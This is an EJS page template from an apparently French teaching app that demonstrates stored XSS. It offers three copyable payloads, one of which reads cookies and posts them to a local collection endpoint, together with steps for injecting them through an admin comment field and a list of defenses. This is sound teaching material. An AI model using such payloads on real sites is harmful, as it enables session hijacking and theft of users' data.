<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %> - XSS VADI</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <% const currentPage = 'admin'; %>
  <%- include('../partials/navbar') %>

  <div class="alert alert-warning alert-banner">
    <span class="alert-icon">&#127925;</span>
    <div class="alert-content">
      <p class="alert-message"><strong>DEMONSTRATION PEDAGOGIQUE</strong> - Payloads XSS pour la classe</p>
    </div>
  </div>

  <main class="container py-xl">
    <h1 class="mb-lg">&#127925; Payloads de demonstration</h1>

    <div class="alert alert-danger mb-xl">
      <span class="alert-icon">&#9888;</span>
      <div class="alert-content">
        <p class="alert-title">Usage pedagogique uniquement</p>
        <p class="alert-message">Ces payloads sont destines a illustrer les concepts XSS en classe. Ne JAMAIS utiliser sur des systemes sans autorisation.</p>
      </div>
    </div>

    <!-- Payload 1: Alert simple -->
    <div class="card card-success mb-lg">
      <div class="card-header">
        <h4>&#10003; Payload 1 : Alert simple</h4>
      </div>
      <div class="card-body">
        <p class="text-secondary mb-md">Le payload le plus basique pour demontrer qu'un script s'execute.</p>
        <div class="code-block">
          <pre><code id="payload1">&lt;img src="x" onerror="alert('XSS Demo - Ceci est une alerte inoffensive')"&gt;</code></pre>
        </div>
        <button class="btn btn-success mt-md" onclick="copyPayload('payload1')">Copier</button>
      </div>
    </div>

    <!-- Payload 2: Message visible -->
    <div class="card card-primary mb-lg">
      <div class="card-header">
        <h4>&#128172; Payload 2 : Message visible</h4>
      </div>
      <div class="card-body">
        <p class="text-secondary mb-md">Affiche un message sur la page pour montrer la modification du DOM.</p>
        <div class="code-block">
          <pre><code id="payload2">&lt;div style="background:#f85149;color:white;padding:20px;text-align:center;font-size:18px;border-radius:8px;"&gt;
&#9888; XSS Demo - Cette page a ete modifiee par un script injecte !
&lt;/div&gt;</code></pre>
        </div>
        <button class="btn btn-primary mt-md" onclick="copyPayload('payload2')">Copier</button>
      </div>
    </div>

    <!-- Payload 3: Demo capture locale -->
    <div class="card card-warning mb-lg">
      <div class="card-header">
        <h4>&#127919; Payload 3 : Demo capture demoToken (local)</h4>
      </div>
      <div class="card-body">
        <p class="text-secondary mb-md">Simule une exfiltration de cookie en envoyant le demoToken au serveur local.</p>
        <div class="alert alert-info mb-md">
          <span class="alert-icon">&#128161;</span>
          <div class="alert-content">
            <p class="alert-message">Ce payload envoie UNIQUEMENT le demoToken (cookie de demo) vers /api/collect. Aucune donnee sensible n'est collectee.</p>
          </div>
        </div>
        <div class="code-block">
          <pre><code id="payload3">&lt;img src="x" onerror="
  var token = document.cookie.match(/demoToken=([^;]+)/);
  var user = document.cookie.match(/userName=([^;]+)/);
  fetch('/api/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      demoToken: token ? token[1] : 'NO_TOKEN',
      userName: user ? decodeURIComponent(user[1]) : 'Unknown',
      chapterId: location.pathname.split('/').pop()
    })
  });
  alert('Demo: demoToken envoye au serveur local');
"&gt;</code></pre>
        </div>
        <button class="btn btn-warning mt-md" onclick="copyPayload('payload3')">Copier</button>
      </div>
    </div>

    <!-- Comment utiliser -->
    <div class="card mb-lg">
      <div class="card-header">
        <h4>&#128218; Comment utiliser ces payloads</h4>
      </div>
      <div class="card-body">
        <ol>
          <li class="mb-md">
            <strong>Copier le payload</strong> en cliquant sur le bouton correspondant
          </li>
          <li class="mb-md">
            <strong>Retourner au <a href="/admin">panneau admin</a></strong>
          </li>
          <li class="mb-md">
            <strong>Coller dans "Commentaires globaux"</strong> et publier
          </li>
          <li class="mb-md">
            <strong>Se connecter en tant qu'utilisateur</strong> (autre navigateur ou navigation privee)
          </li>
          <li class="mb-md">
            <strong>Visiter un chapitre</strong> pour voir le payload s'executer
          </li>
          <li>
            <strong>Verifier les captures</strong> dans le panneau admin (pour le payload 3)
          </li>
        </ol>
      </div>
    </div>

    <!-- Se proteger -->
    <div class="card card-success mb-lg">
      <div class="card-header">
        <h4>&#128737; Comment se proteger ?</h4>
      </div>
      <div class="card-body">
        <ul class="checklist">
          <li class="checklist-item"><strong>Echapper les entrees :</strong> Utiliser <code>&lt;%= %&gt;</code> au lieu de <code>&lt;%- %&gt;</code></li>
          <li class="checklist-item"><strong>Sanitizer le HTML :</strong> DOMPurify ou sanitize-html</li>
          <li class="checklist-item"><strong>Content Security Policy :</strong> Bloquer les scripts inline</li>
          <li class="checklist-item"><strong>Cookies HttpOnly :</strong> Empecher l'acces JavaScript</li>
        </ul>
        <a href="/defense" class="btn btn-success mt-md">Voir toutes les defenses</a>
      </div>
    </div>

    <div class="text-center">
      <a href="/admin" class="btn btn-lg">&#8592; Retour au panneau admin</a>
    </div>
  </main>

  <%- include('../partials/footer') %>

  <script src="/js/app.js"></script>
  <script>
    function copyPayload(id) {
      const code = document.getElementById(id).textContent;
      navigator.clipboard.writeText(code).then(() => {
        ToastManager.success('Payload copie !', 2000);
      }).catch(() => {
        // Fallback
        const textarea = document.createElement('textarea');
        textarea.value = code;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        ToastManager.success('Payload copie !', 2000);
      });
    }
  </script>
</body>
</html>
